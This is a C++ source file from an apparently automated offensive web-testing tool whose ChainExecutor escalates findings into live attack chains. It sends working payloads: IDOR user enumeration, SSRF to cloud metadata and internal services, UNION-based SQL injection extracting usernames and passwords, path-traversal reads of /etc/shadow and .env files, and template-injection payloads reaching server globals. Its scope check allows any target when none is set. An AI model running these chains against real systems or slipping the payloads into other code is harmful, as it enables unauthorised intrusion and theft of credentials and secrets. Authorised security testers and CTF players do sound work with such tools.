/// @file chain.cpp
/// @brief Attack chain executor: escalates findings into full exploit chains.
#include "chain.hpp"
#include <iostream>
#include <regex>

namespace apex {

ChainExecutor::ChainExecutor(const Config &cfg, HttpClient &http)
    : cfg_(cfg), http_(http) {}

bool ChainExecutor::in_scope(const std::string &url) const {
  if (cfg_.scope.empty())
    return true;
  return url.find(cfg_.scope) != std::string::npos ||
         url.find(cfg_.target) != std::string::npos;
}

std::vector<AttackChain>
ChainExecutor::execute(const std::vector<Finding> &findings) {
  std::vector<AttackChain> chains;

  for (const auto &f : findings) {
    AttackChain chain;
    if (f.type == "IDOR" || f.type == "idor")
      chain = chain_idor(f);
    else if (f.type == "SSRF" || f.type == "ssrf")
      chain = chain_ssrf(f);
    else if (f.type == "SQLi" || f.type == "sqli")
      chain = chain_sqli(f);
    else if (f.type == "JWT" || f.type == "jwt")
      chain = chain_jwt(f);
    else if (f.type == "LFI" || f.type == "lfi")
      chain = chain_lfi(f);
    else if (f.type == "SSTI" || f.type == "ssti")
      chain = chain_ssti(f);
    else
      continue;

    if (!chain.steps.empty()) {
      chain.initial_finding = f;
      chains.push_back(std::move(chain));
    }
  }

  return chains;
}

AttackChain ChainExecutor::chain_idor(const Finding &f) {
  AttackChain chain;

  // Step 1: Try user IDs 0-10 to find admin/other users
  std::regex id_re(R"((/\d+))");
  std::string base_url = f.url;
  std::smatch match;

  if (!std::regex_search(base_url, match, id_re))
    return chain;

  std::string prefix = match.prefix().str();
  std::string suffix = match.suffix().str();

  for (int id = 0; id <= 5; ++id) {
    std::string url = prefix + "/" + std::to_string(id) + suffix;
    auto resp = http_.get(url);

    ChainStep step;
    step.action = "http_get";
    step.url = url;
    step.reason = "Enumerate user ID " + std::to_string(id);
    step.success = (resp.status_code == 200 && !resp.body.empty());
    step.result = resp.body.substr(0, 200);
    chain.steps.push_back(step);

    // Look for sensitive fields in response
    if (step.success) {
      if (resp.body.find("reset_token") != std::string::npos ||
          resp.body.find("password") != std::string::npos ||
          resp.body.find("secret") != std::string::npos ||
          resp.body.find("admin") != std::string::npos) {
        chain.impact = "Access to other users' sensitive data via IDOR";
        chain.proof =
            "User ID " + std::to_string(id) + " contains sensitive fields";
        chain.complete = true;
        break;
      }
    }
  }

  chain.depth = static_cast<int>(chain.steps.size());
  return chain;
}

AttackChain ChainExecutor::chain_ssrf(const Finding &f) {
  AttackChain chain;

  // Step 1: Try cloud metadata endpoints
  std::vector<std::pair<std::string, std::string>> targets = {
      {"http://169.254.169.254/latest/meta-data/", "AWS metadata"},
      {"http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"},
      {"http://169.254.169.254/metadata/instance", "Azure metadata"},
      {"http://127.0.0.1:6379/", "Internal Redis"},
      {"http://127.0.0.1:9090/", "Internal admin"},
      {"http://127.0.0.1:3000/", "Internal service"},
  };

  // Extract the SSRF injection point from the finding
  std::string inject_url = f.url;
  if (inject_url.find("url=") == std::string::npos &&
      inject_url.find("webhook") == std::string::npos)
    return chain;

  for (const auto &[target, desc] : targets) {
    // Replace the URL parameter value with our target
    std::string payload_url = inject_url;
    auto pos = payload_url.find("url=");
    if (pos != std::string::npos) {
      payload_url = payload_url.substr(0, pos + 4) + target;
    }

    auto resp = http_.get(payload_url);

    ChainStep step;
    step.action = "http_get";
    step.url = payload_url;
    step.reason = "SSRF to " + desc;
    step.success = (resp.status_code == 200 && resp.body.size() > 10);
    step.result = resp.body.substr(0, 200);
    chain.steps.push_back(step);

    if (step.success) {
      chain.impact = "SSRF reaches " + desc;
      chain.proof = resp.body.substr(0, 500);
      chain.complete = true;
      break;
    }
  }

  chain.depth = static_cast<int>(chain.steps.size());
  return chain;
}

AttackChain ChainExecutor::chain_sqli(const Finding &f) {
  AttackChain chain;

  // Step 1: Try UNION-based extraction
  std::string base = f.url;
  if (f.param.empty())
    return chain;

  std::vector<std::string> payloads = {
      "' UNION SELECT NULL,NULL,NULL--",
      "' UNION SELECT username,password,NULL FROM users--",
      "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
  };

  for (const auto &payload : payloads) {
    std::string url = base + "&" + f.param + "=" + payload;
    auto resp = http_.get(url);

    ChainStep step;
    step.action = "http_get";
    step.url = url;
    step.reason = "SQLi data extraction";
    step.success = (resp.status_code == 200 &&
                    resp.body.find("admin") != std::string::npos);
    step.result = resp.body.substr(0, 200);
    chain.steps.push_back(step);

    if (step.success) {
      chain.impact = "Database credential extraction via SQLi";
      chain.proof = resp.body.substr(0, 500);
      chain.complete = true;
      break;
    }
  }

  chain.depth = static_cast<int>(chain.steps.size());
  return chain;
}

AttackChain ChainExecutor::chain_jwt(const Finding &f) {
  AttackChain chain;

  // Step 1: Try 'none' algorithm bypass
  // Step 2: Try common weak secrets
  ChainStep step;
  step.action = "jwt_forge";
  step.reason = "Attempt JWT none algorithm or weak secret";
  step.url = f.url;

  // We note the technique but actual JWT forging needs the token
  step.result = "JWT attack requires token extraction first";
  step.success = false;
  chain.steps.push_back(step);

  chain.impact = "Authentication bypass via JWT manipulation";
  chain.depth = 1;
  return chain;
}

AttackChain ChainExecutor::chain_lfi(const Finding &f) {
  AttackChain chain;

  std::vector<std::pair<std::string, std::string>> targets = {
      {"../../../etc/passwd", "System users"},
      {"../../../etc/shadow", "Password hashes"},
      {"../../../proc/self/environ", "Environment variables"},
      {"../../../app/.env", "Application secrets"},
      {"../../../tmp/flag.txt", "CTF flag"},
  };

  for (const auto &[path, desc] : targets) {
    std::string url = f.url;
    // Replace the file parameter value
    auto pos = url.rfind("=");
    if (pos != std::string::npos) {
      url = url.substr(0, pos + 1) + path;
    }

    auto resp = http_.get(url);

    ChainStep step;
    step.action = "http_get";
    step.url = url;
    step.reason = "LFI read " + desc;
    step.success = (resp.status_code == 200 && resp.body.size() > 5 &&
                    (resp.body.find("root:") != std::string::npos ||
                     resp.body.find("FLAG{") != std::string::npos ||
                     resp.body.find("SECRET") != std::string::npos));
    step.result = resp.body.substr(0, 200);
    chain.steps.push_back(step);

    if (step.success) {
      chain.impact = "Arbitrary file read: " + desc;
      chain.proof = resp.body.substr(0, 500);
      chain.complete = true;
      break;
    }
  }

  chain.depth = static_cast<int>(chain.steps.size());
  return chain;
}

AttackChain ChainExecutor::chain_ssti(const Finding &f) {
  AttackChain chain;

  // Escalate from detection to RCE
  std::vector<std::pair<std::string, std::string>> payloads = {
      {"{{config}}", "Config disclosure"},
      {"{{self.__init__.__globals__}}", "Global variables"},
      {"{{''.__class__.__mro__[1].__subclasses__()}}", "Class enumeration"},
  };

  for (const auto &[payload, desc] : payloads) {
    std::string url = f.url;
    auto pos = url.rfind("=");
    if (pos != std::string::npos) {
      url = url.substr(0, pos + 1) + payload;
    }

    auto resp = http_.get(url);

    ChainStep step;
    step.action = "http_get";
    step.url = url;
    step.reason = "SSTI escalation: " + desc;
    step.success = (resp.status_code == 200 &&
                    (resp.body.find("SECRET") != std::string::npos ||
                     resp.body.find("subprocess") != std::string::npos));
    step.result = resp.body.substr(0, 200);
    chain.steps.push_back(step);

    if (step.success) {
      chain.impact = "Server-Side Template Injection → " + desc;
      chain.proof = resp.body.substr(0, 500);
      chain.complete = true;
      break;
    }
  }

  chain.depth = static_cast<int>(chain.steps.size());
  return chain;
}

} // namespace apex
